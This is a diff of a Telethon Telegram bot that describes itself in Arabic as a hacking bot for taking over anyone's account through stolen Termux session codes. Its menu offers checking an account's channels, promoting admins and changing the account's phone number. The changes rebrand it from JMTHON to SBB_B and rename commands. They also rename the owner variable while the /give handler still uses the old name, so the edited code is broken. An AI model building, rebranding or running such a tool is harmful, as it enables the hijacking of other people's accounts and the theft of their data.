@@ -20,7 +20,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-razan = 1657933680
+jmthon = 1694386561 
 
 
 async def change_number_code(strses, number, code, otp):
@@ -145,7 +145,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "JMTHON"
+channel = "SBB_B"
 menu = '''
 
 A : [ ** تحقق من قنوات ومجموعات الحساب **]
@@ -175,12 +175,12 @@ L : [** رفع مشرف لشخص معين في قناة او مجموعة **]
 M : [** تغيير رقم الهاتف  **]
 
 ** مميزات اكثر قريبا  **
-BY ~ @JMTHON
+BY ~ @SBB_B
 '''
 mm = '''
 ** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
 
-- اضغط على  /rz
+- اضغط على  /jm
 **
 '''
 @client.on(events.NewMessage(pattern="/start"))
@@ -193,18 +193,18 @@ async def op(event):
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == razan:
-    return await event.reply("@JMTHON")
-  async for x in client.iter_messages("RR9R7"):
+    return await event.reply("@SBB_B")
+  async for x in client.iter_messages("SBB_B"):
     try:
-      await x.forward_to("RR9R7")
+      await x.forward_to("SBB_B")
     except:
       pass
 
 
-@client.on(events.NewMessage(pattern="/rz", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/jm", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
-@client.on(events.NewMessage(pattern="/rz", func = lambda x: x.is_private))
+@client.on(events.NewMessage(pattern="/jm", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
@@ -385,10 +385,10 @@ async def start(event):
         else:
           await event.respond("هناك شي خطا")
       except Exception as e:
-        await event.respond("اارسل هذا الخطأ الى @JMTHON \n**الخطـأ**\n" + str(e))
+        await event.respond("اارسل هذا الخطأ الى @SBB_B \n**الخطـأ**\n" + str(e))
 
     else:
-      await event.respond("▾∮ استخدم /rz فقط")
+      await event.respond("▾∮ استخدم /jm فقط")
 
 
 
